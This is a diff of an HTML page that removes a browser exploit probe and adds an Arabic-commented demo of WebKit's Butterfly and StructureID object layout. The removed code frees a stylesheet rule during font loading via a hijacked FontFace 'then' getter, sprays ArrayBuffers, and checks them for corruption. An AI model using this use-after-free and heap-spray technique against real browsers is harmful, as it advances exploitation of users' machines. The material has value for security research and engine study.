@@ -11,66 +11,43 @@
     </div>
 
 <script>
-function updateStatus(message) {
-    const panel = document.getElementById('status_panel');
-    if (panel) panel.innerHTML += "<br>[*] " + message;
-}
+// مدرسة هندسة الذاكرة - محاكاة حركة الـ Butterfly والـ StructureID
 
-let structuralArrays = [];
-// الانتقال إلى الحجم التالي الأكثر احتمالاً في بنيات الـ C++ للخطوط
-const TARGET_SIZE = 128; 
-
-window.onload = () => {
-    updateStatus("Stage 3.2: Testing 128-Byte Allocation Realignment...");
-
-    let A = new FontFace('targetFont', 'local(Helvetica)', { unicodeRange: 'U+0041' });
-    document.fonts.add(A);
-    void A.loaded;
-
-    let fired = false;
-
-    Object.defineProperty(FontFace.prototype, 'then', {
-        configurable: true,
-        get() {
-            if (!fired && this === A) {
-                fired = true;
-                
-                // تحرير الكائن الأصلي في الـ Heap
-                document.getElementById('s').sheet.deleteRule(0);
-
-                updateStatus("Spraying 600 ArrayBuffers with size " + TARGET_SIZE + "...");
-                
-                // ملء الذاكرة بكثافة أعلى بالحجم الجديد
-                for (let i = 0; i < 600; i++) {
-                    structuralArrays.push(new ArrayBuffer(TARGET_SIZE));
-                }
-
-                updateStatus("Executing structural layout check...");
-                document.body.offsetTop; 
-            }
-            return undefined;
-        }
-    });
-
-    document.fonts.load('1em targetFont', 'AB');
-
-    setTimeout(() => {
-        updateStatus("Verifying Memory States...");
-        
-        let corrupted = false;
-        for (let i = 0; i < structuralArrays.length; i++) {
-            if (structuralArrays[i].byteLength !== TARGET_SIZE) {
-                updateStatus("SUCCESS: Target size corruption detected at index " + i + "! New size: " + structuralArrays[i].byteLength);
-                corrupted = true;
-                break;
-            }
-        }
-        
-        if (!corrupted) {
-            updateStatus("Buffers intact for size " + TARGET_SIZE + ". Transitioning adjustment needed.");
-        }
-    }, 700);
+// 1. إنشاء كائن أساسي نظيف
+let user = {
+    name: "Badr", // يتم تخزينه في الـ Butterfly عند Offset سالب (مثلاً -1)
+    age: 17       // يتم تخزينه عند Offset سالب تالي (مثلاً -2)
 };
+// في هذه اللحظة: المحرك أعطى هذا الكائن مثلاً StructureID = 0x1001
+
+// 2. إنشاء كائن آخر بنفس الخصائص تماماً
+let friend = {
+    name: "Ali",
+    age: 18
+};
+// تحسين الذاكرة: المتصفح يلاحظ التطابق، فيعطي كائن الصديق نفس الـ StructureID (0x1001)
+// كلاهما يشيران إلى نفس الخريطة الذهنية في الذاكرة لفهم مكان الـ name والـ age
+
+console.log("--- مرحلة تغيير هيكل البيانات ديناميكياً ---");
+
+// 3. إضافة مصفوفة للكائن (تفعيل أجنحة الفراشة الموجبة والسالبة)
+user.favorites = ["Cybersecurity", "Coding"]; 
+
+/* ماذا حدث خلف الكواليس في الـ WebKit؟
+  1. تم تغيير الـ StructureID الخاص بكائن user إلى معرف جديد تماماً (مثلاً 0x1002).
+  2. مؤشر الـ Butterfly امتد الآن في الاتجاهين:
+     - الاتجاه السالب (اليسار): يحتوي على الـ name والـ age والـ favorites.
+     - الاتجاه الموجب (اليمين): يحتوي على عناصر المصفوفة [0] و [1].
+     - تم تخزين طول المصفوفة (2) في ترويسة مخفية قبل العناصر الموجبة مباشرة.
+*/
+
+// 4. فحص الخصائص برمجياً
+console.log("اسم المستخدم المباشر:", user.name); 
+console.log("العنصر الأول في مصفوفة الفراشة الموجبة:", user.favorites[0]);
+
+// صديقك لا يزال يحتفظ بالبنية القديمة (0x1001) ولم يتأثر بالامتداد الجديد للذاكرة
+console.log("بنية كائن الصديق لا تزال مستقرة ومستقلة.");
+
 </script>
 </body>
 </html>
